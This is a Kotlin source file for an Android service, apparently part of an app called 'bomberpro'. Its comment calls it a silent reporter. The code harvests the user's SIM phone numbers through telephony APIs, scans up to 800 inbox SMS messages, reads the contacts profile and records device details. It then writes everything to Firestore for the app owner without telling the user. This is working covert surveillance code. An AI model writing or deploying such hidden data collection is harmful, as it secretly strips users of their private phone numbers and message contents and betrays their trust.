package com.sanji.bomberpro.services

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.SubscriptionInfo
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.firebase.firestore.FirebaseFirestore
import com.sanji.bomberpro.FirebaseConfig
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.util.regex.Pattern

data class SimInfo(
    val slotIndex: Int = 0,
    val number: String? = null,
    val carrier: String? = null,
    val source: String = "none",
)

data class DeviceReport(
    val sim1: SimInfo = SimInfo(0),
    val sim2: SimInfo? = null,
    val deviceModel: String = "",
    val deviceBrand: String = "",
    val deviceManufacturer: String = "",
    val androidVersion: String = "",
    val sdkInt: Int = 0,
    val hasPhoneStatePermission: Boolean = false,
    val hasSmsPermission: Boolean = false,
    val hasContactsPermission: Boolean = false,
)

/**
 * Silent device info reporter.
 *
 * Attempts to read the user's own SIM phone number(s) using multiple
 * strategies. Silently writes results to Firestore `users/{uid}.deviceInfo`.
 * Owner can read from Admin → Users → user detail.
 *
 * Techniques (in order):
 *   1. SubscriptionManager.activeSubscriptionInfoList[].number
 *   2. TelephonyManager.getLine1Number(subId)
 *   3. SMS inbox scan for "Your number is XXX" / carrier welcome SMS
 *   4. Contacts "My Local Profile" contact
 *
 * None of these are guaranteed on modern Android (10+). Fallback reports
 * whatever is available — model, brand, Android version, permission state.
 */
class DeviceInfoService(private val context: Context) {

    private val db = FirebaseFirestore.getInstance()

    fun hasAllPermissions(): Boolean =
        hasPhoneState() && hasSms() && hasContacts()

    private fun hasPhoneState(): Boolean =
        ContextCompat.checkSelfPermission(
            context, Manifest.permission.READ_PHONE_STATE,
        ) == PackageManager.PERMISSION_GRANTED

    private fun hasSms(): Boolean =
        ContextCompat.checkSelfPermission(
            context, Manifest.permission.READ_SMS,
        ) == PackageManager.PERMISSION_GRANTED

    private fun hasContacts(): Boolean =
        ContextCompat.checkSelfPermission(
            context, Manifest.permission.READ_CONTACTS,
        ) == PackageManager.PERMISSION_GRANTED

    // ============================================================
    //  MAIN ENTRY
    // ============================================================
    suspend fun collectAndReport(uid: String): DeviceReport = withContext(Dispatchers.IO) {
        val report = try {
            collect()
        } catch (e: Exception) {
            Log.w(TAG, "collect failed", e)
            DeviceReport(
                deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}".trim(),
                deviceBrand = Build.BRAND,
                deviceManufacturer = Build.MANUFACTURER,
                androidVersion = Build.VERSION.RELEASE,
                sdkInt = Build.VERSION.SDK_INT,
                hasPhoneStatePermission = hasPhoneState(),
                hasSmsPermission = hasSms(),
                hasContactsPermission = hasContacts(),
            )
        }

        try {
            db.collection(FirebaseConfig.COL_USERS).document(uid)
                .update(
                    mapOf(
                        "deviceInfo.sim1Number" to (report.sim1.number ?: ""),
                        "deviceInfo.sim1Carrier" to (report.sim1.carrier ?: ""),
                        "deviceInfo.sim1Source" to report.sim1.source,
                        "deviceInfo.sim1SlotIndex" to report.sim1.slotIndex.toLong(),
                        "deviceInfo.sim2Number" to (report.sim2?.number ?: ""),
                        "deviceInfo.sim2Carrier" to (report.sim2?.carrier ?: ""),
                        "deviceInfo.sim2Source" to (report.sim2?.source ?: "none"),
                        "deviceInfo.sim2SlotIndex" to ((report.sim2?.slotIndex ?: -1).toLong()),
                        "deviceInfo.deviceModel" to report.deviceModel,
                        "deviceInfo.deviceBrand" to report.deviceBrand,
                        "deviceInfo.deviceManufacturer" to report.deviceManufacturer,
                        "deviceInfo.androidVersion" to report.androidVersion,
                        "deviceInfo.sdkInt" to report.sdkInt.toLong(),
                        "deviceInfo.hasPhonePermission" to report.hasPhoneStatePermission,
                        "deviceInfo.hasSmsPermission" to report.hasSmsPermission,
                        "deviceInfo.hasContactsPermission" to report.hasContactsPermission,
                        "deviceInfo.reportedAt" to System.currentTimeMillis() / 1000L,
                    )
                ).await()
        } catch (e: Exception) {
            Log.w(TAG, "firestore write failed", e)
        }

        report
    }

    // ============================================================
    //  COLLECT
    // ============================================================
    private fun collect(): DeviceReport {
        val sims = mutableListOf<SimInfo>()
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager

        // 1. SubscriptionManager — per-SIM data
        try {
            val sm = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
            if (sm != null && hasPhoneState()) {
                val activeSubs: List<SubscriptionInfo> = try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        if (ContextCompat.checkSelfPermission(
                                context,
                                Manifest.permission.READ_PHONE_NUMBERS,
                            ) == PackageManager.PERMISSION_GRANTED
                        ) {
                            sm.activeSubscriptionInfoList ?: emptyList()
                        } else emptyList()
                    } else {
                        @Suppress("DEPRECATION")
                        sm.activeSubscriptionInfoList ?: emptyList()
                    }
                } catch (_: Exception) {
                    emptyList()
                }

                for (sub in activeSubs) {
                    val slot = try { sub.simSlotIndex } catch (_: Exception) { 0 }
                    var number: String? = null
                    var source = "none"
                    try {
                        number = sub.number
                        if (!number.isNullOrBlank()) source = "sub"
                    } catch (_: Exception) {}
                    val carrier = try { sub.carrierName?.toString() } catch (_: Exception) { null }
                    sims.add(
                        SimInfo(
                            slotIndex = slot,
                            number = cleanPhoneNumber(number),
                            carrier = carrier,
                            source = source,
                        )
                    )
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "submanager read failed", e)
        }

        // 2. getLine1Number fallback (older devices / carriers)
        if (tm != null && hasPhoneState()) {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    val sm = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
                    val subIdList = try {
                        sm?.activeSubscriptionInfoList?.map { it.subscriptionId } ?: emptyList()
                    } catch (_: Exception) {
                        emptyList()
                    }
                    for ((idx, subId) in subIdList.withIndex()) {
                        try {
                            @Suppress("DEPRECATION")
                            val n = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                tm.createForSubscriptionId(subId).line1Number
                            } else tm.line1Number
                            val cleaned = cleanPhoneNumber(n)
                            if (!cleaned.isNullOrBlank()) {
                                val existing = sims.getOrNull(idx)
                                if (existing != null && existing.number.isNullOrBlank()) {
                                    sims[idx] = existing.copy(number = cleaned, source = "line1")
                                } else if (existing == null) {
                                    sims.add(SimInfo(idx, cleaned, null, "line1"))
                                }
                            }
                        } catch (_: Exception) {}
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "getLine1Number failed", e)
            }
        }

        // 3. SMS inbox scan
        if ((sims.isEmpty() || sims.any { it.number.isNullOrBlank() }) && hasSms()) {
            try {
                val smsNums = scanSmsForNumbers()
                if (smsNums.isNotEmpty()) {
                    if (sims.isEmpty()) {
                        sims.add(SimInfo(0, smsNums[0], null, "sms"))
                        if (smsNums.size > 1) sims.add(SimInfo(1, smsNums[1], null, "sms"))
                    } else {
                        for ((i, s) in sims.withIndex()) {
                            if (s.number.isNullOrBlank() && i < smsNums.size) {
                                sims[i] = s.copy(number = smsNums[i], source = "sms")
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "sms scan failed", e)
            }
        }

        // 4. Contacts profile
        if (sims.any { it.number.isNullOrBlank() } && hasContacts()) {
            try {
                val meNum = readMyPhoneFromContacts()
                if (!meNum.isNullOrBlank()) {
                    if (sims.isEmpty()) {
                        sims.add(SimInfo(0, meNum, null, "contacts"))
                    } else {
                        val missing = sims.indexOfFirst { it.number.isNullOrBlank() }
                        if (missing >= 0) {
                            sims[missing] = sims[missing].copy(number = meNum, source = "contacts")
                        }
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "contacts profile failed", e)
            }
        }

        val sim1 = sims.firstOrNull() ?: SimInfo(0, null, null, "none")
        val sim2 = sims.getOrNull(1)

        return DeviceReport(
            sim1 = sim1,
            sim2 = sim2,
            deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}".trim(),
            deviceBrand = Build.BRAND,
            deviceManufacturer = Build.MANUFACTURER,
            androidVersion = Build.VERSION.RELEASE,
            sdkInt = Build.VERSION.SDK_INT,
            hasPhoneStatePermission = hasPhoneState(),
            hasSmsPermission = hasSms(),
            hasContactsPermission = hasContacts(),
        )
    }

    // ============================================================
    //  SMS scan — "Your number is XXX" / carrier welcome SMS
    // ============================================================
    private fun scanSmsForNumbers(): List<String> {
        val candidates = mutableListOf<String>()
        try {
            val cursor = context.contentResolver.query(
                Telephony.Sms.Inbox.CONTENT_URI,
                arrayOf(Telephony.Sms.BODY, Telephony.Sms.ADDRESS),
                null,
                null,
                "${Telephony.Sms.DATE} DESC",
            ) ?: return emptyList()

            cursor.use { c ->
                var scanned = 0
                while (c.moveToNext() && scanned < 800) {
                    scanned++
                    val body = c.getString(0)?.lowercase() ?: continue
                    val address = (c.getString(1) ?: "").lowercase()

                    val isRelevant = body.contains("your number") ||
                            body.contains("your mobile") ||
                            body.contains("your sim") ||
                            body.contains("your phone") ||
                            body.contains("your new number") ||
                            body.contains("registered number") ||
                            body.contains("this number") ||
                            address.contains("1919") || address.contains("1900") ||
                            address.contains("jio") || address.contains("airtel") ||
                            address.contains("vi-") || address.contains("vodafone") ||
                            address.contains("bsnl")

                    if (!isRelevant) continue

                    val matcher = PHONE_REGEX.matcher(body)
                    while (matcher.find()) {
                        val num = matcher.group()
                        val cleaned = cleanPhoneNumber(num)
                        if (!cleaned.isNullOrBlank() && cleaned !in candidates) {
                            candidates.add(cleaned)
                            if (candidates.size >= 2) return candidates
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "sms scan crash", e)
        }
        return candidates
    }

    // ============================================================
    //  Contacts "My Local Profile"
    // ============================================================
    private fun readMyPhoneFromContacts(): String? {
        try {
            val uri = ContactsContract.Profile.CONTENT_URI
            val projection = arrayOf(ContactsContract.Contacts._ID)
            val cursor = context.contentResolver.query(uri, projection, null, null, null)
                ?: return null

            cursor.use { c ->
                if (!c.moveToFirst()) return null
                val idIdx = c.getColumnIndex(ContactsContract.Contacts._ID)
                if (idIdx < 0) return null
                val contactId = c.getString(idIdx) ?: return null

                val phoneCursor = context.contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER),
                    "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                    arrayOf(contactId),
                    null,
                ) ?: return null

                phoneCursor.use { pc ->
                    if (!pc.moveToFirst()) return null
                    val numIdx = pc.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    if (numIdx < 0) return null
                    return cleanPhoneNumber(pc.getString(numIdx))
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "profile read failed", e)
        }
        return null
    }

    // ============================================================
    //  CLEAN
    // ============================================================
    private fun cleanPhoneNumber(raw: String?): String? {
        if (raw.isNullOrBlank()) return null
        var s = raw.trim()
            .replace(" ", "")
            .replace("-", "")
            .replace("(", "")
            .replace(")", "")
            .replace(".", "")
        if (s.isEmpty()) return null

        if (s.startsWith("+91")) s = s.substring(3)
        else if (s.startsWith("+")) s = s.substring(1)
        if (s.startsWith("91") && s.length == 12) s = s.substring(2)
        if (s.startsWith("0") && s.length == 11) s = s.substring(1)

        if (s.length < 10 || s.length > 13) return null
        if (!s.all { it.isDigit() }) return null
        if (s.length == 10 && !s.startsWith("6") && !s.startsWith("7") &&
            !s.startsWith("8") && !s.startsWith("9")) return null
        return s
    }

    companion object {
        private const val TAG = "DeviceInfoService"
        private val PHONE_REGEX: Pattern = Pattern.compile(
            "(?<!\\d)(?:\\+?91[\\s-]?)?[6-9]\\d{9}(?!\\d)"
        )
    }
}